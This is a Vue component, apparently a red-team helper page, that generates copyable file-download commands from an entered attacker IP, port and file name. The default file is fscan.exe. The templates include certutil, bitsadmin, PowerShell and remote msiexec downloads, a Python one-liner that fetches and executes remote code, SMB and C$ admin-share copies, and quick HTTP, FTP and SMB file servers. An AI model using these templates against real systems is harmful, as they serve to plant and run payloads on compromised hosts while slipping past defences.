<script setup>
import {ref, reactive} from 'vue';

// 适合复杂数组
const web = reactive({
  ip: "8.8.8.8",
  port: "8080",
  Source: "fscan.exe",
  name: "f.exe",
})

// 定义 copy 函数：复制指定 id 的 <pre> 内容到剪切板
function copy(id) {
  const preElement = document.getElementById(id);
  if (preElement) {
    const textToCopy = preElement.innerText;  // 获取 <pre> 的文本内容
    navigator.clipboard.writeText(textToCopy)
        .then(() => {
          console.log('复制成功:', textToCopy);  // 可替换为 alert('复制成功！')
        })
        .catch(err => {
          console.error('复制失败:', err);  // 处理错误
        });
  } else {
    console.error('未找到元素:', id);
  }
}

</script>

<template>
  <div class="main_shell">
    <div class="tips input-section"> <!-- 添加 input-section 类以针对输入框优化 -->
      <div class="input-row">
        <label class="label">IP:</label>
        <input type="text" id="ip" v-model="web.ip" name="ip">
        <label class="label">Port:</label>
        <input type="text" id="port" v-model="web.port" name="port">
      </div>
      <div class="input-row">
        <label class="label">源文件:</label>
        <input type="text" id="Source" v-model="web.Source" name="Source">
        <label class="label">目标文件:</label>
        <input type="text" id="name" v-model="web.name" name="name">
      </div>
    </div>

    <div class="main_bountytips">
      <h3>文件下载命令快捷生成:</h3>
      <div class="tips">
        <button @click="copy('cmd007')">Copy</button>
        CMD - Certutil:
        <pre
            id="cmd007">certutil.exe -urlcache -split -f http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} C:\Users\Public\{{
            web.name
          }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd009')">Copy</button>
        Linux - wget:
        <pre id="cmd009">wget http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -O /tmp/{{ web.name }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd010')">Copy</button>
        Linux - curl:
        <pre id="cmd010">curl http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -o /tmp/{{ web.name }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd002')">Copy</button>
        Python3 HTTP:
        <pre id="cmd002">python3 -m http.server {{ web.port }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd001')">Copy</button>
        Python2 HTTP:
        <pre id="cmd001">python -m SimpleHTTPServer {{ web.port }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd003')">Copy</button>
        Python FTP:
        <pre id="cmd003">python -m pyftpdlib -p {{ web.port }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd004')">Copy</button>
        Python3 SMB:
        <pre id="cmd004">python3 impacket-smbserver.py files . -port {{ web.port }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd005')">Copy</button>
        PowerShell - IWR:
        <pre
            id="cmd005">powershell.exe -Command "Invoke-WebRequest -Uri http://{{ web.ip }}:{{ web.port }}/{{
            web.Source
          }} -OutFile {{ web.name }}"</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd006')">Copy</button>
        PowerShell - IEX:
        <pre
            id="cmd006">powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://{{
            web.ip
          }}:{{ web.port }}/{{ web.Source }}', {{ web.name }})"</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd008')">Copy</button>
        CMD - SMB:
        <pre id="cmd008">copy \\{{ web.ip }}\files\{{ web.Source }} {{ web.name }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd011')">Copy</button>
        Windows Bitsadmin:
        <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://{{ web.ip }}:{{ web.port }}/{{ web.Source }}" c:\\Users\\Public\\{{
            web.name
          }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd012')">Copy</button>
        Windows msiexec:
        <pre id="cmd012">msiexec /q /i http://{{ web.ip }}:{{ web.port }}/{{ web.Source }}</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd013')">Copy</button>
        Python Download:
        <pre
            id="cmd013">python -c "import urllib2; exec urllib2.urlopen('http://{{ web.ip }}:{{
            web.port
          }}/{{ web.Source }}').read();"</pre>
      </div>
      <div class="tips">
        <button @click="copy('cmd014')">Copy</button>
        Windows IPC$:
        <pre id="cmd014">copy \{{ web.ip }}\c$\{{ web.Source }} C:\Users\Public\{{ web.name }}</pre>
      </div>
      <div class="tips">
        <blockquote>
          <p>源码参考自File Download Generator：<a href="https://file-downloads.com/" target="_blank">https://file-downloads.com/</a>
          </p>
        </blockquote>
      </div>
    </div>
  </div>
  <br>

</template>


<style>

button {
  padding: 0 5px;
  margin: 0;
}

textarea {
  position: fixed;
  left: -100%;
}

pre {
  font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
  font-size: 12px;
  background-color: #f6f8fa;
  overflow: auto;
  border: 1px solid #898989;
  padding: 5px;
  margin-top: 5px;
  margin-bottom: 5px;
}

.main_shell {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
  padding: 15px;
  border: 1px solid #898989;
}

.main_shell h3 {
  padding-top: 15px;
  font-size: 16px;
}

.main_bountytips {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
}

.main_bountytips h3 {
  padding-top: 15px;
  font-size: 16px;
  margin-top: 1px;
  margin-bottom: 5px;
}


.tips {
  padding-bottom: 5px;
  padding-top: 5px;
  border-bottom: 1px dashed #999;

}

.tips ul {
  display: block;
  list-style-type: disc;
  margin-block-start: 1em;
  margin-block-end: 1em;
  margin-inline-start: 0px;
  margin-inline-end: 0px;
  padding-inline-start: 15px;
}

.tips ul li {
  display: list-item;
  text-align: -webkit-match-parent;
  list-style-type: square;
}

.tips .tips_title {
  font-size: 14px;
  padding-bottom: 10px;
}

.tips blockquote {
  padding: 0 15px;
  margin: 0;
  color: #666;
  border-left: 4px solid #ddd;
}

input[type=text] {
  border: 1px solid #898989;
  font-size: 15px;
  width: 150px;
}
/* 新增样式：输入框对齐 */
.input-section {
  display: flex;
  flex-direction: column;
  gap: 10px; /* 行间距 */
}

.input-row {
  display: flex;
  align-items: center; /* 垂直居中对齐 */
  gap: 10px; /* 输入组间距 */
}

.label {
  width: 70px; /* 固定标签宽度，确保对齐 */
  text-align: right; /* 右对齐标签文本 */
  margin-right: 5px; /* 标签与输入框间距 */
  background-color: #f6f8fa;
  border: 1px dotted #898989;
}
</style>
